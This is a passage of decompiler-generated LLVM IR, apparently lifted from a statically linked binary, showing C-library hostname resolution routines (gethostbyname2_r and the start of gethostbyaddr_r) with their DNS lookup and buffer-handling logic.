dec_label_pc_1001e358:                            ; preds = %dec_label_pc_1001e0b4, %dec_label_pc_1001e0ac, %dec_label_pc_1001e060, %entry, %dec_label_pc_1001e338, %dec_label_pc_1001e214, %dec_label_pc_1001e158, %dec_label_pc_1001e354
  store i32 %v0_1001e02c, i32* %r0.global-to-local, align 4
  %v0_1001e368 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001e368

; uselistorder directives
  uselistorder i32 %v0_1001e2dc, { 1, 0 }
  uselistorder i32 %v1_1001e2ac, { 1, 0 }
  uselistorder i32 %v1_1001e2a0, { 1, 0 }
  uselistorder i32 %v1_1001e298, { 1, 0 }
  uselistorder i32 %v0_1001e284, { 1, 0 }
  uselistorder i32 %v1_1001e2983, { 1, 0 }
  uselistorder i32 %v1_1001e260, { 1, 0, 2, 3 }
  uselistorder i32 %v2_1001e258, { 1, 0, 2 }
  uselistorder i32 %v0_1001e1e0, { 0, 5, 4, 1, 3, 2 }
  uselistorder i32 %v1_1001e124, { 1, 0, 2 }
  uselistorder i32 %v0_1001e0e0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1001e0c8, { 4, 3, 2, 1, 0 }
  uselistorder i32 %tmp19, { 0, 1, 3, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 21, 7, 8, 1, 4, 3, 9, 2, 10, 11, 12, 13, 15, 14, 16, 6, 17, 18, 5, 19, 20, 22, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 3, 4, 5, 6, 1, 9, 7, 8, 10, 11, 12, 13, 14, 16, 17, 15, 18, 19 }
  uselistorder i32* %ctr.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1001e358, { 7, 4, 5, 6, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1001e338, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1001e2d4, { 1, 0 }
  uselistorder label %dec_label_pc_1001e280, { 1, 0 }
  uselistorder label %dec_label_pc_1001e0e0, { 1, 0 }
}

define i32 @gethostbyname2_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r22.global-to-local = alloca i32, align 4
  %r25.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %v0_1001e370 = load i32, i32* @lr, align 4
  store i32 %v0_1001e370, i32* %r0.global-to-local, align 4
  %v0_1001e374 = load i32, i32* @r4, align 4
  %v3_1001e374 = icmp eq i32 %v0_1001e374, 2
  %v0_1001e37c = load i32, i32* @r5, align 4
  %v0_1001e384 = load i32, i32* @r6, align 4
  store i32 %v0_1001e384, i32* @r26, align 4
  %v0_1001e388 = load i32, i32* @r7, align 4
  store i32 %v0_1001e388, i32* @r30, align 4
  %v0_1001e38c = load i32, i32* @r8, align 4
  store i32 %v0_1001e38c, i32* %r22.global-to-local, align 4
  %v0_1001e390 = load i32, i32* @r9, align 4
  store i32 %v0_1001e390, i32* @r27, align 4
  store i32 %arg1, i32* @r25, align 4
  br i1 %v3_1001e374, label %dec_label_pc_1001e39c, label %dec_label_pc_1001e3b8

dec_label_pc_1001e39c:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1001e3b4.1217 to i32), i32* @lr, align 4
  %v6_1001e3b0 = inttoptr i32 %v0_1001e384 to i32*
  %v7_1001e3b0 = call i32 @gethostbyname_r(i32 %v0_1001e37c, i32* %v6_1001e3b0, i32 %v0_1001e388, i32 %v0_1001e38c, i32 %v0_1001e390, i32 %v0_1001e390)
  store i32 %v7_1001e3b0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e630

dec_label_pc_1001e3b8:                            ; preds = %entry
  %v3_1001e3b8 = icmp eq i32 %v0_1001e374, 10
  br i1 %v3_1001e3b8, label %dec_label_pc_1001e3c0, label %dec_label_pc_1001e618

dec_label_pc_1001e3c0:                            ; preds = %dec_label_pc_1001e3b8
  store i32 268559300, i32* @lr, align 4
  %v0_1001e3c0 = call i32 @__open_nameservers()
  store i32 %v0_1001e3c0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r29, align 4
  %v0_1001e3c8 = load i32, i32* @r25, align 4
  %v3_1001e3c8 = icmp eq i32 %v0_1001e3c8, 0
  %v1_1001e3cc = load i32, i32* %r22.global-to-local, align 4
  %v2_1001e3cc = inttoptr i32 %v1_1001e3cc to i32*
  store i32 0, i32* %v2_1001e3cc, align 4
  br i1 %v3_1001e3c8, label %dec_label_pc_1001e618, label %dec_label_pc_1001e3d4

dec_label_pc_1001e3d4:                            ; preds = %dec_label_pc_1001e3c0
  %v0_1001e3d4 = call i32 @__errno_location()
  store i32 %v0_1001e3d4, i32* %r3.global-to-local, align 4
  %v1_1001e3dc = inttoptr i32 %v0_1001e3d4 to i32*
  %v2_1001e3dc = load i32, i32* %v1_1001e3dc, align 4
  store i32 %v2_1001e3dc, i32* @r24, align 4
  %v0_1001e3e4 = load i32, i32* @r29, align 4
  store i32 %v0_1001e3e4, i32* %v1_1001e3dc, align 4
  %v0_1001e3e8 = load i32, i32* @r31, align 4
  %v0_1001e3ec = load i32, i32* @r25, align 4
  store i32 %v0_1001e3ec, i32* %r3.global-to-local, align 4
  %v0_1001e3f0 = load i32, i32* @r26, align 4
  %v0_1001e3f4 = load i32, i32* @r30, align 4
  %v0_1001e3f8 = load i32, i32* %r22.global-to-local, align 4
  %v0_1001e3fc = load i32, i32* @r27, align 4
  store i32 268559364, i32* @lr, align 4
  %v7_1001e400 = call i32 @__get_hosts_byname_r(i32 %v0_1001e3ec, i32 10, i32 %v0_1001e3e8, i32 %v0_1001e3f0, i32 %v0_1001e3f4, i32 %v0_1001e3f8, i32 %v0_1001e3fc)
  store i32 %v7_1001e400, i32* %r3.global-to-local, align 4
  %v3_1001e404 = icmp eq i32 %v7_1001e400, 0
  br i1 %v3_1001e404, label %dec_label_pc_1001e630, label %dec_label_pc_1001e40c

dec_label_pc_1001e40c:                            ; preds = %dec_label_pc_1001e3d4
  %v0_1001e40c = load i32, i32* @r27, align 4
  %v1_1001e40c = inttoptr i32 %v0_1001e40c to i32*
  %v2_1001e40c = load i32, i32* %v1_1001e40c, align 4
  store i32 %v2_1001e40c, i32* %r0.global-to-local, align 4
  %v3_1001e410 = icmp eq i32 %v2_1001e40c, 1
  br i1 %v3_1001e410, label %dec_label_pc_1001e42c, label %dec_label_pc_1001e418

dec_label_pc_1001e418:                            ; preds = %dec_label_pc_1001e40c
  %v3_1001e418 = icmp eq i32 %v2_1001e40c, 4
  br i1 %v3_1001e418, label %dec_label_pc_1001e44c, label %dec_label_pc_1001e420

dec_label_pc_1001e420:                            ; preds = %dec_label_pc_1001e418
  %v3_1001e420 = icmp eq i32 %v2_1001e40c, -1
  br i1 %v3_1001e420, label %dec_label_pc_1001e43c, label %dec_label_pc_1001e630

dec_label_pc_1001e42c:                            ; preds = %dec_label_pc_1001e40c
  br label %dec_label_pc_1001e44c

dec_label_pc_1001e43c:                            ; preds = %dec_label_pc_1001e420
  %v0_1001e43c = load i32, i32* @r28, align 4
  %v1_1001e43c = inttoptr i32 %v0_1001e43c to i32*
  %v2_1001e43c = load i32, i32* %v1_1001e43c, align 4
  store i32 %v2_1001e43c, i32* %r0.global-to-local, align 4
  %v3_1001e440 = icmp eq i32 %v2_1001e43c, 2
  br i1 %v3_1001e440, label %dec_label_pc_1001e44c, label %dec_label_pc_1001e630

dec_label_pc_1001e44c:                            ; preds = %dec_label_pc_1001e418, %dec_label_pc_1001e43c, %dec_label_pc_1001e42c
  store i32 0, i32* @r29, align 4
  %v0_1001e44c = load i32, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1001e454 = load i32, i32* @r24, align 4
  %v1_1001e454 = load i32, i32* @r28, align 4
  %v2_1001e454 = inttoptr i32 %v1_1001e454 to i32*
  store i32 %v0_1001e454, i32* %v2_1001e454, align 4
  %v0_1001e458 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e458 = load i32, i32* @r27, align 4
  %v2_1001e458 = inttoptr i32 %v1_1001e458 to i32*
  store i32 %v0_1001e458, i32* %v2_1001e458, align 4
  %tmp11 = icmp ult i32 %v0_1001e44c, 16
  br i1 %tmp11, label %dec_label_pc_1001e62c, label %dec_label_pc_1001e460

dec_label_pc_1001e460:                            ; preds = %dec_label_pc_1001e44c
  %v0_1001e460 = load i32, i32* @r30, align 4
  %v1_1001e460 = add i32 %v0_1001e460, -16
  store i32 %v1_1001e460, i32* %r0.global-to-local, align 4
  %tmp12 = icmp ult i32 %v1_1001e460, 8
  br i1 %tmp12, label %dec_label_pc_1001e62c, label %dec_label_pc_1001e46c

dec_label_pc_1001e46c:                            ; preds = %dec_label_pc_1001e460
  %v1_1001e46c = add i32 %v0_1001e460, -24
  store i32 %v1_1001e46c, i32* @r24, align 4
  %v0_1001e470 = load i32, i32* @r26, align 4
  %v1_1001e470 = add i32 %v0_1001e470, 16
  store i32 %v1_1001e470, i32* @r23, align 4
  store i32 0, i32* @r28, align 4
  %v3_1001e47c = inttoptr i32 %v1_1001e470 to i32*
  store i32 %v0_1001e470, i32* %v3_1001e47c, align 4
  %v0_1001e480 = load i32, i32* @r28, align 4
  %v1_1001e480 = load i32, i32* @r23, align 4
  %v2_1001e480 = add i32 %v1_1001e480, 4
  %v3_1001e480 = inttoptr i32 %v2_1001e480 to i32*
  store i32 %v0_1001e480, i32* %v3_1001e480, align 4
  %tmp13 = icmp ult i32 %v1_1001e46c, 256
  br i1 %tmp13, label %dec_label_pc_1001e62c, label %dec_label_pc_1001e488

dec_label_pc_1001e488:                            ; preds = %dec_label_pc_1001e46c
  %v0_1001e488 = load i32, i32* @r26, align 4
  %v1_1001e488 = add i32 %v0_1001e488, 24
  store i32 %v1_1001e488, i32* @r30, align 4
  %v0_1001e48c = load i32, i32* @r25, align 4
  store i32 %v0_1001e48c, i32* @r4, align 4
  %v0_1001e490 = load i32, i32* @r24, align 4
  store i32 %v1_1001e488, i32* %r3.global-to-local, align 4
  store i32 268559516, i32* @lr, align 4
  %v3_1001e498 = call i32 @strncpy(i32 %v1_1001e488, i32 %v0_1001e48c, i32 %v0_1001e490)
  %v0_1001e49c = load i32, i32* @r25, align 4
  store i32 %v0_1001e49c, i32* @r4, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v0_1001e4a4 = load i32, i32* @r26, align 4
  store i32 %v0_1001e4a4, i32* @r5, align 4
  store i32 268559532, i32* @lr, align 4
  %v3_1001e4a8 = call i32 @inet_pton(i32 10)
  store i32 %v3_1001e4a8, i32* %r3.global-to-local, align 4
  %v3_1001e4ac = icmp eq i32 %v3_1001e4a8, 0
  br i1 %v3_1001e4ac, label %dec_label_pc_1001e4dc, label %dec_label_pc_1001e4b4

dec_label_pc_1001e4b4:                            ; preds = %dec_label_pc_1001e488
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1001e4bc = load i32, i32* @r31, align 4
  %v2_1001e4bc = add i32 %v1_1001e4bc, 8
  %v3_1001e4bc = inttoptr i32 %v2_1001e4bc to i32*
  store i32 10, i32* %v3_1001e4bc, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v0_1001e4c4 = load i32, i32* @r30, align 4
  %v1_1001e4c4 = load i32, i32* @r31, align 4
  %v2_1001e4c4 = inttoptr i32 %v1_1001e4c4 to i32*
  store i32 %v0_1001e4c4, i32* %v2_1001e4c4, align 4
  %v0_1001e4c8 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001e4c8 = load i32, i32* @r31, align 4
  %v2_1001e4c8 = add i32 %v1_1001e4c8, 12
  %v3_1001e4c8 = inttoptr i32 %v2_1001e4c8 to i32*
  store i32 %v0_1001e4c8, i32* %v3_1001e4c8, align 4
  %v0_1001e4cc = load i32, i32* @r23, align 4
  %v1_1001e4cc = load i32, i32* @r31, align 4
  %v2_1001e4cc = add i32 %v1_1001e4cc, 16
  %v3_1001e4cc = inttoptr i32 %v2_1001e4cc to i32*
  store i32 %v0_1001e4cc, i32* %v3_1001e4cc, align 4
  %v0_1001e4d0 = load i32, i32* @r31, align 4
  %v1_1001e4d0 = load i32, i32* @r22, align 4
  %v2_1001e4d0 = inttoptr i32 %v1_1001e4d0 to i32*
  store i32 %v0_1001e4d0, i32* %v2_1001e4d0, align 4
  %v0_1001e4d4 = load i32, i32* @r28, align 4
  %v1_1001e4d4 = load i32, i32* @r27, align 4
  %v2_1001e4d4 = inttoptr i32 %v1_1001e4d4 to i32*
  store i32 %v0_1001e4d4, i32* %v2_1001e4d4, align 4
  br label %dec_label_pc_1001e630

dec_label_pc_1001e4dc:                            ; preds = %dec_label_pc_1001e488
  %v0_1001e4dc = load i32, i32* @r29, align 4
  %v3_1001e4dc = icmp eq i32 %v0_1001e4dc, 0
  br i1 %v3_1001e4dc, label %dec_label_pc_1001e4e4, label %dec_label_pc_1001e620

dec_label_pc_1001e4e4:                            ; preds = %dec_label_pc_1001e4dc
  %v2_1001e4e4 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1001e4e4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 40, i32* @r5, align 4
  store i32 0, i32* %r25.global-to-local, align 4
  store i32 268559608, i32* @lr, align 4
  %v0_1001e4f4 = call i32 @__GI_memset()
  store i32 %v0_1001e4f4, i32* %r3.global-to-local, align 4
  %v2_1001e4fc = ptrtoint i32* %stack_var_-100 to i32
  %v2_1001e544 = ptrtoint i32* %stack_var_-104 to i32
  %v3_1001e584 = icmp eq i32 %tmp4, 5
  %v0_1001e514.pre = load i32, i32* %r25.global-to-local, align 4
  br label %dec_label_pc_1001e4f8

dec_label_pc_1001e4f8:                            ; preds = %dec_label_pc_1001e58c, %dec_label_pc_1001e4e4
  %v0_1001e514 = phi i32 [ %v0_1001e5a8, %dec_label_pc_1001e58c ], [ %v0_1001e514.pre, %dec_label_pc_1001e4e4 ]
  store i32 %v2_1001e4fc, i32* @r28, align 4
  store i32 %v2_1001e4fc, i32* %r3.global-to-local, align 4
  %v1_1001e514 = add i32 %v0_1001e514, 1
  store i32 %v1_1001e514, i32* %r25.global-to-local, align 4
  %v4_1001e518 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-100, i32 268527832, i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  store i32 ptrtoint (i32* @global_var_10045068.1211 to i32), i32* %r3.global-to-local, align 4
  store i32 268559652, i32* @lr, align 4
  %v1_1001e520 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10045068.1211 to i32))
  %v3_1001e528 = load i32, i32* @global_var_1004526c.1212, align 4
  store i32 %v3_1001e528, i32* @r29, align 4
  store i32 %v2_1001e4fc, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268559672, i32* @lr, align 4
  %v0_1001e534 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001e53c = load i32, i32* @r29, align 4
  %v0_1001e550 = load i32, i32* @r30, align 4
  store i32 %v0_1001e550, i32* %r3.global-to-local, align 4
  store i32 268559704, i32* @lr, align 4
  %v6_1001e554 = inttoptr i32 %v0_1001e550 to i8*
  %v7_1001e554 = call i32 @__dns_lookup(i8* %v6_1001e554, i32 28, i32 %v0_1001e53c, i32 ptrtoint (i32* @global_var_1004eee4.1213 to i32), i32 %v2_1001e544, i32 %v2_1001e4e4)
  %v0_1001e558 = load i32, i32* @r24, align 4
  %v1_1001e55c = icmp slt i32 %v7_1001e554, 0
  %v0_1001e560 = load i32, i32* @r30, align 4
  store i32 %v0_1001e560, i32* %r3.global-to-local, align 4
  br i1 %v1_1001e55c, label %dec_label_pc_1001e620, label %dec_label_pc_1001e568

dec_label_pc_1001e568:                            ; preds = %dec_label_pc_1001e4f8
  %v3_1001e568 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1001e568, i32* @r4, align 4
  store i32 268559728, i32* @lr, align 4
  %v3_1001e56c = call i32 @strncpy(i32 %v0_1001e560, i32 %v3_1001e568, i32 %v0_1001e558)
  %v3_1001e570 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1001e570, i32* @r3, align 4
  store i32 268559736, i32* @lr, align 4
  %v0_1001e574 = call i32 @free()
  store i32 %v0_1001e574, i32* %r3.global-to-local, align 4
  store i32 %tmp4, i32* %r0.global-to-local, align 4
  br i1 %v3_1001e584, label %dec_label_pc_1001e58c, label %dec_label_pc_1001e5c4

dec_label_pc_1001e58c:                            ; preds = %dec_label_pc_1001e568
  %v0_1001e580 = load i32, i32* @r24, align 4
  %v0_1001e57c = load i32, i32* @r30, align 4
  store i32 %tmp3, i32* @r4, align 4
  %v3_1001e590 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001e590, i32* %r3.global-to-local, align 4
  store i32 268559768, i32* @lr, align 4
  %v4_1001e594 = call i32 @__decode_dotted(i32 %v3_1001e590, i32 %tmp3, i32 %v0_1001e57c, i32 %v0_1001e580)
  store i32 %v4_1001e594, i32* @r29, align 4
  %v3_1001e59c = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001e59c, i32* @r3, align 4
  store i32 268559780, i32* @lr, align 4
  %v0_1001e5a0 = call i32 @free()
  store i32 %v0_1001e5a0, i32* %r3.global-to-local, align 4
  %v0_1001e5a4 = load i32, i32* @r29, align 4
  %v0_1001e5a8 = load i32, i32* @r25, align 4
  %v0_1001e5ac.not = icmp sgt i32 %v0_1001e5a4, -1
  %tmp14 = icmp slt i32 %v0_1001e5a8, 6
  %or.cond = and i1 %tmp14, %v0_1001e5ac.not
  br i1 %or.cond, label %dec_label_pc_1001e4f8, label %dec_label_pc_1001e5b4

dec_label_pc_1001e5b4:                            ; preds = %dec_label_pc_1001e58c
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e5bc

dec_label_pc_1001e5bc:                            ; preds = %dec_label_pc_1001e620, %dec_label_pc_1001e5cc, %dec_label_pc_1001e5b4
  %v0_1001e5bc = phi i32 [ 1, %dec_label_pc_1001e620 ], [ %v0_1001e5bc.pre, %dec_label_pc_1001e5cc ], [ 3, %dec_label_pc_1001e5b4 ]
  %v1_1001e5bc = load i32, i32* @r27, align 4
  %v2_1001e5bc = inttoptr i32 %v1_1001e5bc to i32*
  store i32 %v0_1001e5bc, i32* %v2_1001e5bc, align 4
  br label %dec_label_pc_1001e630

dec_label_pc_1001e5c4:                            ; preds = %dec_label_pc_1001e568
  %v3_1001e5c4 = icmp eq i32 %tmp4, 28
  br i1 %v3_1001e5c4, label %dec_label_pc_1001e5cc, label %dec_label_pc_1001e60c

dec_label_pc_1001e5cc:                            ; preds = %dec_label_pc_1001e5c4
  store i32 16, i32* @r5, align 4
  %v0_1001e5d4 = load i32, i32* @r26, align 4
  store i32 %v0_1001e5d4, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001e5dc.1218 to i32), i32* @lr, align 4
  %v0_1001e5d8 = call i32 @memcpy()
  %v1_1001e5e0 = load i32, i32* @r31, align 4
  %v2_1001e5e0 = add i32 %v1_1001e5e0, 8
  %v3_1001e5e0 = inttoptr i32 %v2_1001e5e0 to i32*
  store i32 10, i32* %v3_1001e5e0, align 4
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_1001e5e8 = load i32, i32* @r31, align 4
  %v2_1001e5e8 = add i32 %v1_1001e5e8, 12
  %v3_1001e5e8 = inttoptr i32 %v2_1001e5e8 to i32*
  store i32 16, i32* %v3_1001e5e8, align 4
  %v0_1001e5ec = load i32, i32* @r30, align 4
  %v1_1001e5ec = load i32, i32* @r31, align 4
  %v2_1001e5ec = inttoptr i32 %v1_1001e5ec to i32*
  store i32 %v0_1001e5ec, i32* %v2_1001e5ec, align 4
  %v0_1001e5f0 = load i32, i32* @r23, align 4
  %v1_1001e5f0 = load i32, i32* @r31, align 4
  %v2_1001e5f0 = add i32 %v1_1001e5f0, 16
  %v3_1001e5f0 = inttoptr i32 %v2_1001e5f0 to i32*
  store i32 %v0_1001e5f0, i32* %v3_1001e5f0, align 4
  %v3_1001e5f4 = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001e5f4, i32* @r3, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1001e5fc.1219 to i32), i32* @lr, align 4
  %v0_1001e5f8 = call i32 @free()
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001e604 = load i32, i32* @r31, align 4
  %v1_1001e604 = load i32, i32* @r22, align 4
  %v2_1001e604 = inttoptr i32 %v1_1001e604 to i32*
  store i32 %v0_1001e604, i32* %v2_1001e604, align 4
  %v0_1001e5bc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e5bc

dec_label_pc_1001e60c:                            ; preds = %dec_label_pc_1001e5c4
  %v3_1001e60c = load i32, i32* %stack_var_-104, align 4
  store i32 %v3_1001e60c, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1001e614.1220 to i32), i32* @lr, align 4
  %v0_1001e610 = call i32 @free()
  store i32 %v0_1001e610, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e620

dec_label_pc_1001e618:                            ; preds = %dec_label_pc_1001e3b8, %dec_label_pc_1001e3c0
  store i32 22, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e630

dec_label_pc_1001e620:                            ; preds = %dec_label_pc_1001e4f8, %dec_label_pc_1001e4dc, %dec_label_pc_1001e60c
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001e5bc

dec_label_pc_1001e62c:                            ; preds = %dec_label_pc_1001e46c, %dec_label_pc_1001e460, %dec_label_pc_1001e44c
  store i32 34, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1001e630

dec_label_pc_1001e630:                            ; preds = %dec_label_pc_1001e43c, %dec_label_pc_1001e420, %dec_label_pc_1001e3d4, %dec_label_pc_1001e618, %dec_label_pc_1001e5bc, %dec_label_pc_1001e4b4, %dec_label_pc_1001e39c, %dec_label_pc_1001e62c
  store i32 %v0_1001e370, i32* %r0.global-to-local, align 4
  %v0_1001e640 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001e640

; uselistorder directives
  uselistorder i32 %v0_1001e5a8, { 1, 0 }
  uselistorder i32 %v1_1001e488, { 1, 0, 2 }
  uselistorder i32 %tmp4, { 0, 2, 1 }
  uselistorder i32 %tmp3, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 23, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_1001e630, { 7, 3, 4, 5, 0, 1, 2, 6 }
  uselistorder label %dec_label_pc_1001e620, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1001e618, { 1, 0 }
  uselistorder label %dec_label_pc_1001e44c, { 1, 2, 0 }
}

define i32 @__GI_gethostbyaddr_r(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r20.global-to-local = alloca i32, align 4
  %r23.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  %tmp17 = call i32 @__decompiler_undefined_function_0()
  %tmp18 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-116 = alloca i32, align 4
  %stack_var_-100 = alloca i32, align 4
  %v0_1001e648 = load i32, i32* @lr, align 4
  store i32 %tmp, i32* @r28, align 4
  %v4_1001e650 = icmp eq i8* %arg1, null
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_1001e65c = load i32, i32* @r9, align 4
  store i32 %v0_1001e65c, i32* %r19.global-to-local, align 4
  %v2_1001e660 = inttoptr i32 %v0_1001e65c to i32*
  store i32 0, i32* %v2_1001e660, align 4
  %v0_1001e664 = load i32, i32* @r4, align 4
  store i32 %v0_1001e664, i32* @r27, align 4
  %v0_1001e668 = load i32, i32* @r5, align 4
  store i32 %v0_1001e668, i32* @r22, align 4
  %v0_1001e66c = load i32, i32* @r6, align 4
  store i32 %v0_1001e66c, i32* @r26, align 4
  %v0_1001e670 = load i32, i32* @r7, align 4
  store i32 %v0_1001e670, i32* @r31, align 4
  %v0_1001e674 = load i32, i32* @r8, align 4
  store i32 %v0_1001e674, i32* @r29, align 4
  %v0_1001e678 = load i32, i32* @r10, align 4
  store i32 %v0_1001e678, i32* @r25, align 4
  br i1 %v4_1001e650, label %dec_label_pc_1001e944, label %dec_label_pc_1001e680

dec_label_pc_1001e680:                            ; preds = %entry
  %v2_1001e680 = ptrtoint i32* %stack_var_-100 to i32
  store i32 %v2_1001e680, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 40, i32* @r5, align 4
  store i32 268560016, i32* @lr, align 4
  %v0_1001e68c = call i32 @__GI_memset()
  store i32 %v0_1001e68c, i32* %r3.global-to-local, align 4
  %v0_1001e690 = load i32, i32* @r22, align 4
  %v3_1001e690 = icmp eq i32 %v0_1001e690, 2
  br i1 %v3_1001e690, label %dec_label_pc_1001e6a4, label %dec_label_pc_1001e698

dec_label_pc_1001e698:                            ; preds = %dec_label_pc_1001e680
  %v3_1001e698 = icmp eq i32 %v0_1001e690, 10
  br i1 %v3_1001e698, label %dec_label_pc_1001e6b0, label %dec_label_pc_1001e944

dec_label_pc_1001e6a4:                            ; preds = %dec_label_pc_1001e680
  %v0_1001e6a4 = load i32, i32* @r27, align 4
  %v3_1001e6a4 = icmp eq i32 %v0_1001e6a4, 4
  br i1 %v3_1001e6a4, label %dec_label_pc_1001e6b4, label %dec_label_pc_1001e944

dec_label_pc_1001e6b0:                            ; preds = %dec_label_pc_1001e698
  %v0_1001e6ac = load i32, i32* @r27, align 4
  %v3_1001e6ac = icmp eq i32 %v0_1001e6ac, 16
  br i1 %v3_1001e6ac, label %dec_label_pc_1001e6b4, label %dec_label_pc_1001e944

dec_label_pc_1001e6b4:                            ; preds = %dec_label_pc_1001e6a4, %dec_label_pc_1001e6b0
  %v0_1001e6b8 = phi i32 [ 4, %dec_label_pc_1001e6a4 ], [ 16, %dec_label_pc_1001e6b0 ]
  %v0_1001e6b4 = load i32, i32* @r28, align 4
  store i32 %v0_1001e6b4, i32* %r3.global-to-local, align 4
  %v0_1001e6c0 = load i32, i32* @r26, align 4
  %v0_1001e6c4 = load i32, i32* @r31, align 4
  %v0_1001e6c8 = load i32, i32* @r29, align 4
  %v0_1001e6cc = load i32, i32* %r19.global-to-local, align 4
  %v0_1001e6d0 = load i32, i32* @r25, align 4
  store i32 %v0_1001e6d0, i32* @r10, align 4
  store i32 268560088, i32* @lr, align 4
  %v8_1001e6d4 = call i32 @__get_hosts_byaddr_r(i32 %v0_1001e6b4, i32 %v0_1001e6b8, i32 %v0_1001e690, i32 %v0_1001e6c0, i32 %v0_1001e6c4, i32 %v0_1001e6c8, i32 %v0_1001e6cc)
  store i32 %v8_1001e6d4, i32* %r3.global-to-local, align 4
  %v3_1001e6d8 = icmp eq i32 %v8_1001e6d4, 0
  br i1 %v3_1001e6d8, label %dec_label_pc_1001e968, label %dec_label_pc_1001e6e0

dec_label_pc_1001e6e0:                            ; preds = %dec_label_pc_1001e6b4
  %v0_1001e6e0 = load i32, i32* @r25, align 4
  %v1_1001e6e0 = inttoptr i32 %v0_1001e6e0 to i32*
  %v2_1001e6e0 = load i32, i32* %v1_1001e6e0, align 4
  store i32 %v2_1001e6e0, i32* %r0.global-to-local, align 4
  %v3_1001e6e4 = icmp eq i32 %v2_1001e6e0, 1
  br i1 %v3_1001e6e4, label %dec_label_pc_1001e6f4, label %dec_label_pc_1001e6ec

dec_label_pc_1001e6ec:                            ; preds = %dec_label_pc_1001e6e0
  %v3_1001e6ec = icmp eq i32 %v2_1001e6e0, 4
  br i1 %v3_1001e6ec, label %dec_label_pc_1001e6f4, label %dec_label_pc_1001e968

dec_label_pc_1001e6f4:                            ; preds = %dec_label_pc_1001e6ec, %dec_label_pc_1001e6e0
  store i32 ptrtoint (i32* @global_var_1001e6f8.1221 to i32), i32* @lr, align 4
  %v0_1001e6f4 = call i32 @__open_nameservers()
  store i32 %v0_1001e6f4, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_1001e6fc = load i32, i32* @r29, align 4
  %v1_1001e700 = load i32, i32* @r25, align 4
  %v2_1001e700 = inttoptr i32 %v1_1001e700 to i32*
  store i32 -1, i32* %v2_1001e700, align 4
  %tmp25 = icmp ult i32 %v0_1001e6fc, 4
  br i1 %tmp25, label %dec_label_pc_1001e964, label %dec_label_pc_1001e708

dec_label_pc_1001e708:                            ; preds = %dec_label_pc_1001e6f4
  %v0_1001e708 = load i32, i32* @r29, align 4
  %v1_1001e708 = add i32 %v0_1001e708, -4
  store i32 %v1_1001e708, i32* %r0.global-to-local, align 4
  %tmp26 = icmp ult i32 %v1_1001e708, 8
  br i1 %tmp26, label %dec_label_pc_1001e964, label %dec_label_pc_1001e714

dec_label_pc_1001e714:                            ; preds = %dec_label_pc_1001e708
